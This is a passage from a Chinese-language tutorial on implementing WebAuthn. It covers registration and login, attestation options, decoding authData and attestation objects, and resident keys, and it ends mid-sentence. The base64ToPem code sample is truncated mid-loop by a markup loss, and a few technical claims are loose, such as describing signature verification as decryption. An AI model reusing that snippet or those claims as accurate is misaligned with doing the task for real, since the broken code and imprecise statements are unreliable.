字符串了：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">navigator.credentials.create({publicKey}).then((credentialInfo) =&gt; {\r\n    const publicKeyCredential = {\r\n        id: credentialInfo.id,\r\n        type: credentialInfo.type,\r\n        rawId: array2b64String(new Uint8Array(credentialInfo.rawId)),\r\n        response: {\r\n            clientDataJSON: array2b64String(new Uint8Array(credentialInfo.response.clientDataJSON)),\r\n            attestationObject: array2b64String(new Uint8Array(credentialInfo.response.attestationObject))\r\n        }\r\n    };\r\n    return publicKeyCredential;\r\n}).then(JSON.stringify).then((authenticatorResponseJSON) =&gt; {\r\n    // 可以发送了\r\n}).catch((error) =&gt; {\r\n    console.warn(error); // 捕获错误\r\n})</pre>\n<p>依赖方收到数据以后，还需要做三件事：验证挑战、存储凭证 ID 和存储公钥。如果数据解码顺利，且收到的挑战和之前发送的一致，就可以认为注册成功，将凭证 ID 及公钥与用户关联起来。这一步有很多第三方库可以帮我们做，对于基础实现我们就不深入探究了。</p>\n<blockquote><p>由于不同厂商的认证器的实现方式不同，<strong>我们并不能保证凭证 ID 一定是全局唯一的</strong>，也就是说，凭证 ID 有可能碰撞——即使这些凭证实际上是不同的。依赖方在实现凭证 ID 的存储及查找时，需要注意和用户 ID 结合进行存储或查找，或是直接在注册认证器时在服务器端对比阻止相同的凭证 ID。</p></blockquote>\n<hr><p>接下来就可以进行验证了。某天，用户点击了验证按钮准备登录，于是浏览器发送了验证请求到依赖方，同时附上要登录的用户名。接下来依赖方至少需要发送两项内容给浏览器：<strong>挑战和用户已绑定的凭证 ID 列表（即 <code>allowCredentials</code>）。</strong></p>\n<p>之后前端的处理流程就和注册时基本一致了。只是需要注意验证流程中获取到的 <code>PublicKeyCredential</code> 的结构和注册时的稍有不同。</p>\n<p>当浏览器将数据传回后，依赖方需要做的事情就比之前要麻烦一些了。依赖方需要验证挑战，并用之前存储的公钥验证签名和签名计数。同样地，这一步有很多第三方库可以帮我们做。最后，如果验证全部通过，我们就可以允许用户登录了。</p>\n<p>到目前为止，我们已经实现了一个简单的 WebAuthn 验证服务。不过这只是一个最基础的实现，对于很多高安全要求的身份认证这是远远不够的。因此，我们需要摆脱对第三方库的依赖，深入了解 WebAuthn。你可以继续阅读“<a href=\"https://flyhigher.top/#deep-into-webauthn\">深入了解 WebAuthn</a>”部分，不过对于基础的 WebAuthn 实现，我们的旅程就到这里了。</p>\n<h2>拓展阅读</h2>\n<p>如果你的目标只是快速了解如何开发 WebAuthn，那么你阅读到这里就可以了。同时，上一节例子中的部分代码来自于我为了这篇文章开发的 WordPress 插件 WP-WebAuthn，这个插件可以为你的 WordPress 启用 WebAuthn 无密码登录（并非二步验证），你可以查阅插件的 <a href=\"https://github.com/yrccondor/wp-webauthn\">GitHub 存储库</a>了解更多，也可以自己安装试一试。</p>\n<p>如果你正在使用 Chrome 开发，Chrome 87+ 版本添加了一个 WebAuthn 开发者面板，可以帮助你在没有任何实体验证器的情况下开发 WebAuthn 功能。你可以在 Google 的<a href=\"https://developers.google.com/web/tools/chrome-devtools/webauthn\">这篇文章</a>中了解更多。不够，如果你正在使用 Firefox，很遗憾目前我还没有找到对应的开发工具或是浏览器扩展可用。</p>\n<p>如果你希望了解更多关于非对称加密的数学证明，可以查阅阮一峰老师的<a href=\"http://www.ruanyifeng.com/blog/2013/06/rsa_algorithm_part_one.html\">这篇文章</a>。</p>\n<p>如果你希望了解更多关于 Credential Management API 的信息，可以查阅<a href=\"https://medium.com/dev-channel/sign-in-on-the-web-credential-management-api-and-best-practices-d21aed14b6fe\">这篇文章</a>（英文）。</p>\n<p>如果你希望了解更多 WebAuthn 的细节，可以继续往下阅读。<span></span></p>\n<h1>深入了解 WebAuthn</h1>\n<p>如上文所说，如果摆脱对第三方库的依赖，或是要实现更安全的 WebAuthn，我们必须深入了解 WebAuthn。在这一部分中，我们会详细讨论上文没有提到的一些概念和参数，并了解 WebAuthn 中各类数据的结构以实现解码与验证。先来看一看一些进阶的选项吧。</p>\n<h2>进阶选项</h2>\n<p>没错，上文提到的传入 <code>navigator.credentials.create()</code> 和 <code>navigator.credentials.get()</code> 方法的参数其实只是所有参数的一部分。对于 <code>create()</code>，我们还可以配置这些可选内容（上文提及的已省略）：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">navigator.credentials.create({\r\n    publicKey: {\r\n        rp: {\r\n            icon\r\n        },\r\n        user: {\r\n            icon\r\n        },\r\n        attestation,\r\n        authenticatorSelection: {\r\n            requireResidentKey\r\n        },\r\n        extensions\r\n    }\r\n})</pre>\n</pre>\n<ul>\n<li>\n<code>rp.icon: String</code> 和 <code>user.icon</code>：是的，你可以为依赖方和用户设置图标，可以使用 HTTPS URL 或 Base64，一般长度不能超过 128 字节，不过大部分浏览器不会显示图标，或是有非常小的图片体积限制，所以一般没有使用这一属性的必要</li>\n<li>\n<code>attestation: String</code>：表明依赖方是否需要证明。可选三个值：\n<ul>\n<li>\n<code>none</code>：（默认）不需要证明。如上文所述，依赖方不关心证明，因此认证器不会签名。对于 iOS/iPad OS 13，必须设置为此值，否则验证将失败</li>\n<li>\n<code>indirect</code>：依赖方需要证明，但证明方式可由认证器选择。在支持匿名证明的认证器上，认证器会通过匿名证明的方式签名挑战，并向依赖方提供签名方式等信息</li>\n<li>\n<code>direct</code>：依赖方要求直接证明。此时认证器会使用烧录在认证器中的公钥进行签名，同时向依赖方提供签名方式等信息以供依赖方验证认证器是否可信。更多信息可以阅读“<a href=\"https://flyhigher.top/#verify-authenticator\">验证认证器</a>”一节</li>\n</ul>\n</li>\n<li>在 <code>authenticatorSelection</code> 中，我们还可以设置两个可选属性：\n<ul>\n<li>\n<code>authenticatorSelection.requireResidentKey: Boolean</code>：是否要求将私钥钥永久存储于认证器中。默认值为 <code>false</code>。对于 iOS/iPad OS 13，必须设置为 <code>false</code>，否则验证将失败</li>\n</ul>\n</li>\n</ul>\n<li>\n<code>extensions: Object</code>：WebAuthn 扩展，可以提供规范之外的配置和响应。由于实际情况中很少会使用这一特性，我们不会在这篇文章中讨论它</li>\n\n<blockquote><p>将 <code>requireResidentKey</code> 设置为 <code>true</code> 可以实现无用户名的登录，即认证器同时替代了用户名和密码。需要注意的是，尽管大部分认证器可以实现无限对公私钥，<strong>但能永久存储的私钥数量是有限的</strong>（对于 Yubikey，这通常是 25），因此只应在真正需要的时候启用此特性。我们会在“<a href=\"https://flyhigher.top/#login-without-username\">无用户名登录</a>”一节中详细讨论原因。</p></blockquote>\n<blockquote><p><strong>如果你没有高安全需求（如银行交易等），请不要向认证器索取证明</strong>，即将 <code>attestation</code> 设置为 \"none\"。对于普通身份认证来说，要求证明不必要的，且会有浏览器提示打扰到用户。</p></blockquote>\n<blockquote><p>Android 暂时无法实施用户验证，进而会导致依赖方验证失败。你可以在<a href=\"https://bugs.chromium.org/p/chromium/issues/detail?id=997538\">这里</a>追踪这个特性的实现情况。</p></blockquote>\n<blockquote>\n<p>对于 <code>extensions</code>，由于目前浏览器支持和应用范围有限，我们不会在这篇文章中涉及，不过你可以看一个例子：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">extensions: {\r\n    uvm: true, // 要求认证器返回用户进行验证的方法\r\n    txAuthSimple: \"Please proceed\" // 在认证器上显示与交易有关的简短消息\r\n}</pre>\n<p>你可以在<a href=\"https://www.w3.org/2019/01/webauthn-extensions.html\">这个页面</a>了解更多关于 <code>extensions</code> 的信息。</p>\n</blockquote>\n<p>对于 <code>get()</code>，我们其实只有一个可选内容没讲了，即 <code>extensions</code>。和上文一样，我们不会在这篇文章中讨论它。</p>\n<p>就这些了！<span></span></p>\n<h2>手动解个码</h2>\n<p>是时候看看如何手动解码了。我们将会在这一节中讨论认证器返回的数据的结构以及如何正确地解码它们。</p>\n<p>首先我们来看看如何处理注册过程中认证器发回的数据。假设所有 <code>ArrayBuffer</code> 类型的值都被正确地以 Base64 编码，且后端已经将 JSON 的字符串解析为字典。先来复习一下，我们得到的数据应该是这样的（数据较长，已省略一部分）：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">{\r\n    id: \"ZRBkDBCEtq...9XY8atOcbg\",\r\n    type: \"public-key\",\r\n    rawId: \"ZRBkDBCEtq...9XY8atOcbg==\",\r\n    response: {\r\n        clientDataJSON: \"eyJjaGFsbGVuZ2U...i5jcmVhdGUifQ==\",\r\n        attestationObject: \"o2NmbXRkbm9uZWd...xNHuAMzz2LxZA==\"\r\n    }\r\n}</pre>\n<p>这里的 <code>id</code> 就是凭证的 ID，如果验证正确，我们最终要将它存储起来并于用户关联。同时可以看到 Base64 编码后的 <code>rawId</code> 其实和 <code>id</code> 是一致的（不过 <code>id</code> 是 Base64URL 编码的）。而 <code>type</code> 则一定是 \"public-key\"。</p>\n<p>不过，我们主要关心的还是 <code>respose</code> 中的两项内容。首先是 <code>clientDataJSON</code>。它的处理比较简单，看名字就知道，它应该是一个 JSON 字符串。</p>\n<blockquote><p>小技巧：如果你看到一个 Base64 编码的字符串以 \"ey\" 开头，那么它大概率是一个 Base64 编码的 JSON。</p></blockquote>\n<p>将<code>clientDataJSON</code> Base64 解码再 JSON 解码之后我们就能得到一个字典：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">{\r\n    challenge: \"NI4i1vsNmP2KHcmyFnBCKRVQPfHgg34SsYZUOPZY2lM\",\r\n    extra_keys_may_be_added_here: \"do not compare clientDataJSON against a template. See https://goo.gl/yabPex\",\r\n    origin: \"https://dev.axton.cc\",\r\n    type: \"webauthn.create\"\r\n}</pre>\n<p>结构一目了然。在这里，我们需要验证三项内容：</p>\n<ul>\n<li>\n<code>challenge</code> 和之前发送的一致</li>\n<li>\n<code>origin</code> 为创建凭证的页面的源（协议+主机名+端口号，并非 URL）</li>\n<li>\n<code>type</code> 为 \"webauthn.create\"</li>\n</ul>\n<p>同时可以注意到有一个奇怪的 <code>extra_keys_may_be_added_here</code>。这其实是 Google 在 Chrome 中搞的一点小把戏，有一定概率会出现，提醒我们需要将 JSON 解析后再验证键值以防额外插入的键值影响验证。具体信息你可以访问那个 URL 看一看。</p>\n<p>对于 Firefox，我们会多得到两项 <code>clientExtensions</code> 和 <code>hashAlgorithm</code> ，分别指明了客户端扩展数据和签名算法。</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\" data-enlighter-highlight=\"3-4\">{\r\n    challenge: \"dg6ost6ujhAA0g6WqLe-SOOH-tbhvjW9Sp90aPKlLJI\",\r\n    clientExtensions: {},\r\n    hashAlgorithm: \"SHA-256\",\r\n    origin: \"https://dev.axton.cc\",\r\n    type: \"webauthn.create\"\r\n}</pre>\n<p>由于本文不考虑扩展数据，因此我们可以不考虑 <code>clientExtensions</code>。同时由于目前规范中指定的签名算法只有 SHA-256 一种，因此现阶段我们也可以简单地忽略 <code>hashAlgorithm</code>。</p>\n<p><code>clientDataJSON</code> 很简单地就处理完了。接下来我们要来看看 <code>attestationObject</code>。先来看看 <code>attestationObject</code> 的结构图示：</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/s1-3.png\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/s1-3.png\" alt=\"attestationObject 的结构\" width=\"1056\" height=\"532\" class=\"aligncenter size-full wp-image-2245\"></a>\n<p><code>attestationObject</code> 是 CBOR 编码后再被 Base64 编码的，因此我们需要额外对其进行 CBOR 解码。</p>\n<blockquote><p>CBOR (Concise Binary Object Representation, 简明二进制对象表示) 是一种多应用于物联网领域的编码方式，你可以将它看作体积更小、更方便物联网传输的二进制 JSON。大部分语言都可以找到对应的 CBOR 解码库。</p></blockquote>\n<p>我们当然不会手解 CBOR，直接来看看解开之后的样子吧：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">{\r\n    fmt: \"none\",\r\n    attStmt: {},\r\n    authData: [211, 217, 43, 24, 199, ..., 97, 238, 166, 67, 107]\r\n}</pre>\n<p>这些键值的含义如下：</p>\n<ul>\n<li>\n<code>fmt</code>：标明证明的格式。WebAuthn 预定义了几种格式，分别为：\n<ul>\n<li>\n<code>none</code>：没有证明</li>\n<li>\n<code>packed</code>：为 WebAuthn 优化的证明格式</li>\n<li>\n<code>android-safetynet</code>：Android 使用的格式</li>\n<li>\n<code>android-key</code>：又是 Android 使用的格式</li>\n<li>\n<code>fido-u2f</code>：FIDO U2F 认证器使用的格式</li>\n<li>\n<code>tpm</code>：TPM 可信平台模块使用的格式</li>\n</ul>\n</li>\n<li>\n<code>attStmt</code>：证明对象，具体格式根据 <code>fmt</code> 的不同会有所不同</li>\n<li>\n<code>authData</code>：包含公钥、签名计数等来自认证器的数据</li>\n</ul>\n<p>诶，例子里的 <code>attStmt</code> 怎么是空的？还记得之前说的吗？大部分情况下，<strong>如果依赖方不要求证明，那么认证器不会签名挑战</strong>，于是 <code>fmt</code> 会变为 \"none\"，<code>attstmt</code> 会为空。如果不是高安全要求，我们可以只对这一种情况做支持。</p>\n<blockquote><p>注意，部分情况下 Firefox 会在不要求证明（即 <code>attestation</code> 为 \"none\"）时会返回 <code>fmt</code> 为 \"packed\" 的证明。<strong>这是符合规范的。</strong>此时认证器会进行自证明，你可以视情况进行处理。具体可以阅读“<a href=\"https://flyhigher.top/#verify-authenticator\">验证认证器</a>”一节。</p></blockquote>\n<p>对于非 \"none\" 的 <code>fmt</code> 我们稍后再谈，现在我们先来看看 <code>authData</code>。来复习一下 <code>authData</code> 的结构：</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/s2-3.png\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/s2-3.png\" alt=\"authData 的结构\" width=\"1056\" height=\"384\" class=\"aligncenter size-full wp-image-2240\"></a>\n<p>对于它的解码比较简单粗暴，我们要做的就是根据图示将它切开，然后适当地转换类型。其中各部分的含义如下：</p>\n<ul>\n<li>\n<code>rpIdHash</code>：如其名，SHA-256 的 <code>rpId</code>，长度 32 字节</li>\n<li>\n<code>flags</code>：标识认证状态，长度 1 字节。其中 8 位分别为：\n<ul>\n<li>\n<code>ED</code>：是否有扩展数据</li>\n<li>\n<code>AT</code>：是否包含 <code>attestedCredentialData</code>。通常注册认证器时会包含 <code>attestedCredentialData</code>，而验证时不包含</li>\n<li>保留位</li>\n<li>保留位</li>\n<li>保留位</li>\n<li>\n<code>UV</code>：用户是否已验证</li>\n<li>保留位</li>\n<li>\n<code>UP</code>：用户是否在场</li>\n</ul>\n</li>\n<li>\n<code>signCount</code>：签名计数，长度 4 字节</li>\n<li>\n<code>attestedCredentialData</code>：包含公钥等凭据数据，变长。其结构如下：\n<ul>\n<li>\n<code>aaguid</code>：认证器的 AAGUID (Authenticator Attestation GUID)，对于同一型号的认证器，它们的 AAGUID 是相同的</li>\n<li>\n<code>credentialIdLength</code>：标识 <code>credentialId</code> 的长度，长度 2 字节</li>\n<li>\n<code>credentialId</code>：凭证 ID，和 <code>rawId</code> 一致，长度由 <code>credentialIdLength</code> 定义</li>\n<li>\n<code>credentialPublicKey</code>：CBOR 编码的 COSE 格式的凭证公钥，变长</li>\n</ul>\n</li>\n<li>\n<code>extensions</code>：扩展数据，变长，本文不讨论</li>\n</ul>\n<blockquote><p>出于隐私考虑，如果不要求证明，认证器会以 0 填充 AAGUID。</p></blockquote>\n<p>如果你的后端在使用 Node.js，这里有个工具函数可以帮你完成这一步（不考虑 <code>extensions</code>）：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">function parseAuthData(buffer){\r\n    let rpIdHash = buffer.slice(0, 32);\r\n    buffer = buffer.slice(32);\r\n  \r\n    let flagsBuf = buffer.slice(0, 1);\r\n    buffer = buffer.slice(1);\r\n\r\n    let flagsInt = flagsBuf[0];\r\n    let flags = {\r\n        up: !!(flagsInt &amp; 0x01),\r\n        uv: !!(flagsInt &amp; 0x04),\r\n        at: !!(flagsInt &amp; 0x40),\r\n        ed: !!(flagsInt &amp; 0x80),\r\n        flagsInt\r\n    }\r\n\r\n    let counterBuf = buffer.slice(0, 4);\r\n    buffer = buffer.slice(4);\r\n  \r\n    let counter = counterBuf.readUInt32BE(0);\r\n\r\n    let aaguid = undefined;\r\n    let credID = undefined;\r\n    let COSEPublicKey = undefined;\r\n\r\n    if(flags.at) {\r\n        aaguid = buffer.slice(0, 16);\r\n        buffer = buffer.slice(16);\r\n\r\n        let credIDLenBuf = buffer.slice(0, 2);\r\n        buffer = buffer.slice(2);\r\n\r\n        let credIDLen = credIDLenBuf.readUInt16BE(0);\r\n        credID = buffer.slice(0, credIDLen);\r\n\r\n        buffer = buffer.slice(credIDLen);\r\n        COSEPublicKey = buffer;\r\n    }\r\n\r\n    return {rpIdHash, flagsBuf, flags, counter, counterBuf, aaguid, credID, COSEPublicKey}\r\n}</pre>\n<p>这段代码来自 <a href=\"https://gist.github.com/herrjemand/dbeb2c2b76362052e5268224660b6fbc\">herrjemand</a></p>\n<p>解开后，依赖方至少需要做四件事情：</p>\n<ol>\n<li>验证 <code>rpIdHash</code> 和预期的一致</li>\n<li>按预期检查用户在场和用户验证状态</li>\n<li>存储签名计数</li>\n<li>存储公钥</li>\n</ol>\n<blockquote><p>签名计数不一定从 0 开始。</p></blockquote>\n<p>对于公钥，也就是 <code>credentialPublicKey</code>，我们需要多一次 CBOR 解码，然后就可以得到类似这样的公钥：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">{\r\n    kty: \"EC\",\r\n    alg: \"ECDSA_w_SHA256\",\r\n    crv: \"P-256\",\r\n    x: \"ZGQALNfqo0L7HFYQHFHCS/X5db49z0ePnuQEs3w3X8w=\",\r\n    y: \"6qYxhnjYuez/Q8N6vX7nIIGfxFWdZ25NzQfZYuYOalA=\"\r\n}</pre>\n<p>然后可以选择适当的方法将其存储起来，之后的步骤本文就不再赘述了。现在，将目光拉回来，让我们看看包含证明的 <code>attestationObject</code> 是怎么样的。我们来看一个例子：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">{\r\n    fmt: \"packed\",\r\n    attStmt: {\r\n        alg: -7,\r\n        sig: [48, 70, 2, 33, 0, ..., 132, 78, 46, 100, 21],\r\n        x5c: [\r\n            [48, 130, 2, 189, 48, 130, 1, 165, 160, 3, ..., 177, 48, 125, 191, 145, 24, 225, 169, 41, 248]\r\n        ]\r\n    },\r\n    authData: [211, 217, 43, 24, 199, ..., 158, 54, 87, 126, 54]\r\n}</pre>\n<p>这里有一个使用 \"packed\" 格式的证明。此时，<code>attStmt</code> 中包含三个值：</p>\n<ul>\n<li>\n<code>alg</code>：签名算法</li>\n<li>\n<code>sig</code>：签名值</li>\n<li>\n<code>x5c</code>：X.509 编码的证书链</li>\n</ul>\n<p>我们不会在这一节中详述对签名的验证。要了解更多信息，你可以阅读“<a href=\"https://flyhigher.top/#verify-authenticator\">验证认证器</a>”一节。现在，让我们来看看如何处理验证过程中认证器发回的数据。我们得到的数据应该是这样的（数据较长，已省略一部分）：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">{\r\n    id: \"hmqdxPLit9...BWeVxZqdvU\",\r\n    type: \"public-key\",\r\n    rawId: \"hmqdxPLit9V...BWeVxZqdvU=\",\r\n    response: {\r\n        authenticatorData: \"09krGMcWTf...UFAAAABA==\",\r\n        clientDataJSON: \"eyJjaGFsbGVuZ2U...XRobi5nZXQifQ==\",\r\n        signature: \"UsXZV3pvT3np8btj6V0g...WBkaqyt88DrD40qh+A==\",\r\n        userHandle: \"MmYxNWYzZjQyZjM...Tg2ZDY4NzhlNw==\"\r\n    }\r\n}</pre>\n<p><code>id</code>, <code>rawId</code> 和 <code>type</code> 和之前一样，这里就不再赘述了。让我们来看看 <code>response</code>。首先是 <code>clientDataJSON</code>，和之前的解法一样，要验证的内容也一样，只是 <code>type</code> 从 \"webauthn.create\" 变成了 \"webauthn.get\"。</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">{\r\n    challenge: \"bnkd2CmrEuvKnAFXs2QlC3SKlg4XFvGtP4HJL1yEWyU\",\r\n    origin: \"https://dev.axton.cc\",\r\n    type: \"webauthn.get\"\r\n}</pre>\n<p>然后是 <code>userHandle</code>。前面讲过，这是认证器在创建凭证时的用户 ID。如果用户在使用 U2F 认证器，很可能这一项为空，所以大部分情况下我们不关心这一项。</p>\n<p>接着来看 <code>authenticatorData</code>。这其实就是之前的 <code>attestedCredentialData</code>，只是这次不包含公钥。以相同的方式切开数据，我们应该可以得到 <code>rpIdHash</code>, <code>flags</code>和 <code>signCount</code> 三项。此时，依赖方至少需要做这三样事情：</p>\n<ol>\n<li>验证 <code>rpIdHash</code> 和预期的一致</li>\n<li>按预期检查用户在场和用户验证状态</li>\n<li>验证签名计数大于之前存储的计数，并更新存储的计数</li>\n</ol>\n<blockquote><p>如果签名计数比之前的小，那么这个认证器很可能是伪造的，应该中止验证并返回验证失败。同时，签名计数不一定每次按 1 递增，通常只要计数比此前的大就认为计数检查通过。</p></blockquote>\n<p>最后，我们来看 <code>signature</code>，也就是签名。不过这个签名不是简单的对挑战的签名，具体算法如图所示：</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/s3-2.png\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/s3-2.png\" alt=\"签名过程\" width=\"1034\" height=\"587\" class=\"aligncenter size-full wp-image-2231\"></a>\n<p>计算签名时，认证器会将 <code>authenticatorData</code> 与 <code>clientDataHash</code>（也就是 <code>clientDataJSON</code> 的 SHA-256 Hash）拼接起来，并使用对应的私钥签名。依赖方应该使用对应的公钥将其解密，并验证内容是否是 <code>authenticatorData</code> 与 <code>clientDataHash</code> 的拼接。这部分的计算不在本文的讨论范围内。</p>\n<p>最后，如果全部验证通过，返回验证成功。<span></span></p>\n<h2>验证认证器</h2>\n<p>WebAuthn 已经很安全了，但有的时候我们还要让它更安全一点。比如，如果用户在使用伪造的或是自制的认证器，认证器的安全性就得不到保证。此时，依赖方就需要验证认证器是否是可信的认证器。</p>\n<blockquote><p>这一过程仅发生在注册认证器时。此时，如果认证器验证通过，就可以存储公钥，后续步骤和之前描述的一致。</p></blockquote>\n<blockquote><p>再次说明，如果不是对安全性有极高的要求，向认证器索取证明以验证认证器是否可信是没有必要的。此外，验证认证器需要依赖方自行维护可信认证器列表，大大增加了维护的复杂性。</p></blockquote>\n<p>在调用 <code>navigator.credentials.create()</code> 时，我们可以将 <code>attestation</code> 设置为非 \"none\" 来向认证器索取证明。除无证明外，WebAuthn 定义了四种证明方式：</p>\n<ul>\n<li>Basic Attestation (Basic) ：基础的证明方式，认证器会使用认证器私钥签名</li>\n<li>Self Attestation (Self) ：自证明，认证器会使用凭证私钥签名</li>\n<li>Attestation CA (AttCA) ：认证器会使用多个证明私钥之一签名</li>\n<li>Elliptic Curve based Direct Anonymous Attestation (ECDAA) ：通过 <a href=\"https://en.wikipedia.org/wiki/Direct_Anonymous_Attestation\">DAA</a> 实现的匿名证明</li>\n</ul>\n<blockquote><p>和验证过程一样，这里签名的目标是 <code>authenticatorData</code> 和 <code>clientDataHash</code> 的连接。</p></blockquote>\n<p>还记得 <code>create()</code> 时 <code>attestation</code> 可选的三个值吗？这个值会决定认证器最终使用哪种方式进行证明。复习一下：</p>\n<ul>\n<li>\n<code>none</code>：大部分情况下认证器会选择不进行证明，部分认证器会进行自证明。此时 AAGUID 会被 0 填充</li>\n<li>\n<code>indirect</code>：认证器会试图通过替换 AAGUID 和选择合适的证明方式来进行匿名证明，具体方式由认证器选择</li>\n<li>\n<code>direct</code>：认证器会提供最直接的证明信息</li>\n</ul>\n<p>注意，大部分情况下，当认证器需要向依赖方证明自己可信时需要提供认证器公钥，<strong>这会触发浏览器提示，只有用户同意后认证器才会进行证明，否则认证器将不提供证明。</strong></p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/5.png\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/5.png\" alt=\"浏览器提示\" width=\"446\" height=\"283\" class=\"aligncenter size-full wp-image-2217\"></a>\n<blockquote><p>为什么浏览器会说“安全密钥的品牌和型号”？事实上，为了避免用户通过认证器证书被跨依赖方追踪，FIDO 要求使用相同认证器证书的认证器的数量不能少于 100,000。于是大部分认证器厂商会选择<strong>让同一型号的认证器共用同一份证书。</strong>因此，浏览器的会询问用户是否同意“查看安全密钥的品牌和型号”。</p></blockquote>\n<blockquote><p>Android Safety Net 不会向用户询问是否同意，而是会静默进行证明。</p></blockquote>\n<p>当证明不为空时，依赖方收到数据后根据 <code>attestationObject.fmt</code> 的不同，需要选择不同的验证方式来验证认证器的可信情况。出于篇幅原因，这里我们不会讨论每一种 <code>fmt</code> 的验证方式，更多信息你可以查阅 <a href=\"https://www.w3.org/TR/webauthn/#defined-attestation-formats\">W3C 文档</a>。</p>\n<p>当 <code>fmt</code> 为 <code>packed</code> 时，<code>attestationObject.attStmt</code> 可能会有三种格式：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">// 自证明\r\n{\r\n    alg, // 算法\r\n    sig // 签名\r\n}\r\n// 基础或证明 CA 证明\r\n{\r\n    alg,\r\n    sig,\r\n    x5c // X.509 证书链\r\n}\r\n// 椭圆曲线证明\r\n{\r\n    alg,\r\n    sig,\r\n    ecdaaKeyId // ECDAA-Issuer 公钥标识符\r\n}</pre>\n<p>此时，依赖方需要检查证书符合预期格式并检查证书是否在可信链上。首先，如果证明中既没有 <code>ecdaaKeyId</code> 也没有 <code>x5c</code>，就说明这个证明使用的是自证明，只需使用认证器提供的公钥验证即可；如果有 <code>x5c</code>，那么就需要验证 <code>x5c</code> 中的证书是否在可信链上。将 <code>x5c</code> 中的每个证书以 Base64 编码，按 64 个字符切开，并在头尾加上 <code>-----BEGIN CERTIFICATE-----</code> 和 <code>-----END CERTIFICATE-----</code>就能得到一个证书字符串了。之后，依赖方需要验证证书是否可信。</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">function base64ToPem(b64cert){\r\n    let pemcert = '';\r\n    for(let i = 0; i \n<p>这段代码来自 <a href=\"https://gist.github.com/herrjemand/dbeb2c2b76362052e5268224660b6fbc\">herrjemand</a></p>\n<p>至于 <code>ecdaaKeyId</code>，由于目前应用较少，处理方法可能需要你另寻资料了。检查证书的具体步骤已经超出了本文的范围，具体可以查阅<a href=\"https://medium.com/@herrjemand/verifying-fido2-packed-attestation-a067a9b2facd\">这篇文章</a>（英文）。</p>\n<blockquote><p>你可以在 <a href=\"https://fidoalliance.org/metadata/\">FIDO Metadata Service</a> 找到各大厂商认证器的可信证书链。</p></blockquote>\n<p>当在 Android 上调起 WebAuthn 时，大部分情况下 <code>fmt</code> 将会为 <code>safety-net</code>。此时 <code>attestationObject.attStmt</code> 的结构会是：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">{\r\n    ver: \"200616037\",\r\n    response: {\r\n        type: \"Buffer\",\r\n        data: [101, 121, 74, 104, 98, ..., 115, 104, 104, 82, 65]\r\n    }\r\n}</pre>\n<p>此时，<code>clientDataJSON</code> 中还会出现 <code>androidPackageName</code> 键，值是调起 WebAuthn 验证的应用的包名，如 Chrome 就是 \"com.android.chrome\"。</p>\n<p>在这个证明中，<code>data</code> 其实是一个 JWT 字符串，我们可以将它编码为字符串并将其按照 JWT 进行解码（别忘了验证 JWT 签名）。最终我们会得到一个类似这样的 Payload：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">{\r\n    nonce: \"0QAurN4F9wik6GEkblDJhGuf4kuaqZn5zaaxlvD1hlA=\",\r\n    timestampMs: 1584950686460,\r\n    apkPackageName: \"com.google.android.gms\",\r\n    apkDigestSha256: \"2BQHno+bmWWwdLUYylS8HLt5ESJzci3nt2uui71ojyE=\",\r\n    ctsProfileMatch: true,\r\n    apkCertificateDigestSha256: [\r\n        \"8P1sW0EPicslw7UzRsiXL64w+O50Ed+RBICtay2g24M=\"\r\n    ],\r\n    basicIntegrity: true,\r\n    evaluationType: \"BASIC\"\r\n}</pre>\n<p>其中包含了有关设备状态的一些信息。比如说，如果 <code>ctsProfileMatch</code> 为 <code>false</code>，那么该设备很有可能被 root 了。对于高安全要求的场景，我们可以视情况进行验证。</p>\n<p>同时我们可以在 JWT Header 中验证证明的有效性。我们应该能取得这样的 Header：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">{\r\n    alg: \"RS256\",\r\n    x5c: [\r\n        \"MIIFkzCCBHugAwIBAgIR...uvlyjOwAzXuMu7M+PWRc\",\r\n        \"MIIESjCCAzKgAwIBAgIN...UK4v4ZUN80atnZz1yg==\"\r\n    ]\r\n}</pre>\n<p>这里的结构就和上方的 <code>x5c</code> 验证类似了。具体步骤可以参考<a href=\"https://medium.com/@herrjemand/verifying-fido2-safetynet-attestation-bd261ce1978d\">这篇文章</a>（英文）。</p>\n<p>其他所有格式的验证方式也都可以在<a href=\"https://medium.com/@herrjemand/verifying-fido2-responses-4691288c8770\">这篇文章</a>（英文）中找到。<span></span></p>\n<h2>无用户名登录</h2>\n<p>认证器已经代替了密码，可是这还不够！在进行第一因素认证（即使用 WebAuthn 登录）时，我们还是需要输入用户名，然后才能进行身份认证。懒惰是第一生产力，我们能不能不输入用户名就进行身份认证呢？实际上，大部分认证器都允许我们无用户名登录。<strong>而这一特性的核心就是 Resident Key 客户端密钥驻留。</strong></p>\n<p>你可以思考一下，为什么普通的 WebAuthn 为什么不能实现无用户名登录？事实上，大部分认证器为了实现无限对公私钥，会将私钥通过 Key Warp 等技术加密后包含在凭证 ID 